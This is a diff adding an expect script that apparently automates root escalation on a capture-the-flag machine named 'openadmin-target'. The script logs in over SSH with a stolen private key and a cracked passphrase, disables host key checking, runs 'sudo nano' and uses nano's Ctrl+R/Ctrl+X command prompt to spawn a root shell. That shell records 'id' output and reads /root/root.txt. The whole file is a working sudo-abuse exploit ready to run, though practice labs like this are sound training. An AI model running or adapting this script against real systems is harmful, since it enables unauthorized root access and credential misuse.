@@ -1,0 +1,31 @@
+#!/usr/bin/expect -f
+set timeout 12
+set env(TERM) xterm
+spawn sshpass -P "Enter passphrase for key" -p "bloodninjas" ssh -tt \
+    -i /tmp/joanna_id_rsa \
+    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+    -o PreferredAuthentications=publickey -o PubkeyAuthentication=yes \
+    joanna@openadmin-target "sudo -n /bin/nano /opt/priv"
+expect {
+    -re "GNU nano" {}
+    -re "nano" {}
+    timeout { puts stderr "nano did not start"; exit 1 }
+}
+send "\022"
+expect {
+    -re "File Name to insert" {}
+    timeout { puts stderr "Ctrl+R prompt not found"; exit 2 }
+}
+send "\030"
+expect {
+    -re "Command to execute" {}
+    timeout { puts stderr "Ctrl+X command prompt not found"; exit 3 }
+}
+send "/bin/sh -c 'id > /tmp/openadmin-root-proof; cat /root/root.txt > /tmp/openadmin-root-flag-proof'\r"
+after 1200
+send "\030"
+expect {
+    -re "Save modified buffer" { send "n\r" }
+    timeout {}
+}
+expect eof
